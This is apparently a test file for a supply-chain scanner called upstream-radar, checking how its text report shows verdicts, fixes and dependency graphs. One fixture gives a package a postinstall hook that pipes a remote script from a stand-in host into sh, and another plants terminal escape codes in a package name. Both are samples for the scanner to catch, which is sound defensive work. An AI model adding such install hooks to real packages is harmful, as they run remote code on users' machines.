import assert from 'node:assert/strict'
import { describe, it } from 'node:test'
import { renderTextReport } from '../src/render.js'
import { scanDirectory } from '../src/scan.js'
import { mkdtemp, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

describe('text report rendering', () => {
  it('escapes terminal control characters from package metadata', async () => {
    const root = await mkdtemp(join(tmpdir(), 'upstream-radar-render-'))
    await writeFile(join(root, 'package.json'), '{"name":"demo\\n\\u001b[31mred","version":"1.0.0"}')

    const rendered = renderTextReport(await scanDirectory(root))
    assert.ok(!rendered.includes('\u001b'))
    assert.match(rendered, /demo\\u000a\\u001b\[31mred/)
  })

  it('turns a review verdict into a concrete next step', async () => {
    const root = await mkdtemp(join(tmpdir(), 'upstream-radar-render-review-'))
    await writeFile(join(root, 'package.json'), '{"name":"clean-example","version":"1.0.0"}')

    const rendered = renderTextReport(await scanDirectory(root))
    assert.match(rendered, /Admission verdict: REVIEW/)
    assert.match(rendered, /Next step: Coverage is incomplete; do not treat an empty finding list as an allow decision\./)
  })

  it('tells the user not to install a blocked package', async () => {
    const root = await mkdtemp(join(tmpdir(), 'upstream-radar-render-block-'))
    await writeFile(join(root, 'package.json'), JSON.stringify({
      name: 'remote-shell',
      version: '1.0.0',
      scripts: { postinstall: 'curl https://example.invalid/install.sh | sh' },
    }))

    const rendered = renderTextReport(await scanDirectory(root))
    assert.match(rendered, /Admission verdict: BLOCK/)
    assert.match(rendered, /Next step: Do not install this package until the blocking finding is resolved\./)
  })

  it('prints the concrete fix for a monitoring-quality finding', async () => {
    const root = await mkdtemp(join(tmpdir(), 'upstream-radar-render-remediation-'))
    await writeFile(join(root, 'package.json'), '{"name":"stale-lock","version":"1.0.0"}')
    await writeFile(join(root, 'package-lock.json'), JSON.stringify({
      name: 'stale-lock',
      version: '0.9.0',
      lockfileVersion: 3,
      packages: { '': { name: 'stale-lock', version: '0.9.0' } },
    }))
    const rendered = renderTextReport(await scanDirectory(root))
    assert.match(rendered, /package-lock root metadata does not match package\.json/)
    assert.match(rendered, /Fix: Regenerate package-lock\.json from the intended package\.json/)
  })

  it('shows the real lockfile graph in a public-repository scan', async () => {
    const root = await mkdtemp(join(tmpdir(), 'upstream-radar-render-graph-'))
    await writeFile(join(root, 'package.json'), JSON.stringify({
      name: 'graph-example',
      version: '1.0.0',
      dependencies: { direct: '1.0.0' },
    }))
    await writeFile(join(root, 'package-lock.json'), JSON.stringify({
      lockfileVersion: 3,
      packages: {
        '': { name: 'graph-example', version: '1.0.0', dependencies: { direct: '1.0.0' } },
        'node_modules/direct': { version: '1.0.0' },
      },
    }))

    const rendered = renderTextReport(await scanDirectory(root))
    assert.match(rendered, /Dependency graph:/)
    assert.match(rendered, /root: graph-example@1\.0\.0/)
    assert.match(rendered, /nodes: 2/)
    assert.match(rendered, /graph-example@1\.0\.0 -> direct@1\.0\.0 \[runtime\]/)
  })

  it('shows the dependency edges that make an artifact review incomplete', async () => {
    const root = await mkdtemp(join(tmpdir(), 'upstream-radar-render-coverage-'))
    await writeFile(join(root, 'package.json'), '{"name":"coverage-example","version":"1.0.0"}')
    const report = await scanDirectory(root)
    report.evidence.npm = {
      registry: 'https://registry.npmjs.org/',
      tarball: 'https://registry.npmjs.org/coverage-example/-/coverage-example-1.0.0.tgz',
      compressedBytes: 1,
      unpackedBytes: 1,
      integrity: { status: 'verified', algorithm: 'sha512', expected: 'digest', actual: 'digest' },
      registrySignature: { status: 'verified', keyIds: [] },
      provenance: { status: 'verified' },
      dependencyAudit: {
        status: 'verified',
        packages: 2,
        graphDigest: 'sha256:graph',
        graph: {
          schema: 'upstream-radar.dependency-graph/v1alpha1',
          rootNodeId: 'node_modules/coverage-example',
          nodes: [
            { id: 'node_modules/coverage-example', name: 'coverage-example', version: '1.0.0' },
            { id: 'node_modules/required', name: 'required', version: '1.0.0' },
          ],
          edges: [],
          source: 'npm-lock',
          digest: 'sha256:graph',
          unresolved: [
            { from: 'node_modules/coverage-example', name: 'optional-native', spec: '^1.0.0', kind: 'optional' },
            { from: 'node_modules/required', name: 'required-missing', spec: '1.0.0', kind: 'runtime' },
          ],
        },
        invalidSignatures: [],
        missingSignatures: [],
        vulnerabilities: { info: 0, low: 0, moderate: 0, high: 0, critical: 0, total: 0 },
      },
    }
    const rendered = renderTextReport(report)
    assert.match(rendered, /unresolved dependency edges: 2 \(1 optional\)/)
    assert.match(rendered, /coverage-example@1\.0\.0 -> optional-native \(\^1\.0\.0\) \[optional\]/)
    assert.match(rendered, /required@1\.0\.0 -> required-missing \(1\.0\.0\) \[runtime\]/)
    assert.match(rendered, /explain incomplete coverage, not a confirmed vulnerability/)
  })
})
